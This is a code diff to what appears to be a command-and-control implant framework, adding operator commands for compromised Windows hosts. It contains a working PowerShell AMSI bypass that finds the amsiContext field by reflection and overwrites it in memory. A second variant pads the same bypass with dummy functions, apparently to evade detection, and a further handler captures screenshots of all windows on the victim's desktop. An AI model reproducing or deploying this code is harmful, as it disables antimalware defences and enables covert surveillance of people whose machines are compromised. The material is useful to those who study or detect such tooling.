@@ -107,14 +107,14 @@ def get_commands():
 
 
 @command(commands, commands_help, examples, block_help)
-def do_disable_amsi(user, command, implant_id):
+def do_disable_amsi_1(user, command, implant_id):
     """
     Disables / wipes the amsiContext
 
     ref: https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/av-edr-evasion/amsi-bypass
 
     Examples:
-        disable-amsi
+        disable-amsi-1
     """
 
     command = """
@@ -126,6 +126,91 @@ $g = $f.GetValue($null)
 [IntPtr]$ptr = $g
 [Int32[]]$buf = @(0)
 [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
+"""
+
+    new_task = NewTask(
+        implant_id=implant_id,
+        command=command,
+        user=user,
+        child_implant_id=None
+    )
+
+    insert_object(new_task)
+
+
+@command(commands, commands_help, examples, block_help)
+def do_disable_amsi_2(user, command, implant_id):
+    """
+    Disables / wipes the amsiContext
+
+    ref: https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/av-edr-evasion/amsi-bypass
+
+    Examples:
+        disable-amsi-2
+    """
+
+    command = """
+# Dummy function to simulate some unrelated logic
+function Test-DummyFunction {
+    Write-Output "Starting dummy function..."
+    $x = 10
+    $y = 20
+    $z = $x + $y
+    Write-Output "The sum of $x and $y is $z"
+}
+
+# Another dummy function
+function Another-DummyFunction {
+    Write-Output "Running another dummy function..."
+    $a = "Hello"
+    $b = "World"
+    $c = "$a, $b!"
+    Write-Output $c
+}
+
+# Main script begins
+Write-Output "Initializing the main script..."
+Test-DummyFunction
+Another-DummyFunction
+
+# Reflective assembly analysis
+$a = [Ref].Assembly.GetTypes()
+ForEach($b in $a) {
+    if ($b.Name -like "*iUtils") {
+        $c = $b
+        Write-Output "Found matching type: $($b.Name)"
+    }
+}
+
+# Retrieve specific fields
+$d = $c.GetFields('NonPublic,Static')
+ForEach($e in $d) {
+    if ($e.Name -like "*Context") {
+        $f = $e
+        Write-Output "Found matching field: $($e.Name)"
+    }
+}
+
+# Manipulate field value
+$g = $f.GetValue($null)
+[IntPtr]$ptr = $g
+[Int32[]]$buf = @(0)
+Write-Output "Preparing to copy buffer to memory..."
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
+Write-Output "Buffer copied to memory."
+
+# Additional dummy logic
+function Final-DummyFunction {
+    Write-Output "Executing final dummy function..."
+    $numbers = 1..5
+    foreach ($num in $numbers) {
+        Write-Output "Number: $num"
+    }
+}
+
+# Main script ends
+Final-DummyFunction
+Write-Output "Script execution completed."
 """
 
     new_task = NewTask(
@@ -1074,7 +1159,7 @@ def do_get_multi_screenshot(user, command, implant_id):
     Gets multiple screenshots over a defined period, one screenshot per beacon.
 
     Examples:
-        get-multi-screenshot 2m
+        get-multi-screenshot -timedelay 10 -quantity 30
     """
     pwrStatus = get_power_status(implant_id)
 
@@ -1102,6 +1187,32 @@ def do_stop_multi_screenshot(user, command, implant_id):
     Examples:
         stop-multi-screenshot
     """
+    new_task = NewTask(
+        implant_id=implant_id,
+        command=command,
+        user=user,
+        child_implant_id=None
+    )
+
+    insert_object(new_task)
+
+
+@command(commands, commands_help, examples, block_help)
+def do_get_screenshot_allwindows(user, command, implant_id):
+    """
+    Gets a screenshot of all windows on the the current desktop.
+
+    Examples:
+        get-screenshot-allwindows
+    """
+    pwrStatus = get_power_status(implant_id)
+
+    if pwrStatus is not None and pwrStatus.screen_locked:
+        ri = input("[!] Screen is reported as LOCKED, do you still want to attempt a screenshot? (y/N) ")
+
+        if ri.lower() == "n" or ri.lower() == "":
+            return
+
     new_task = NewTask(
         implant_id=implant_id,
         command=command,
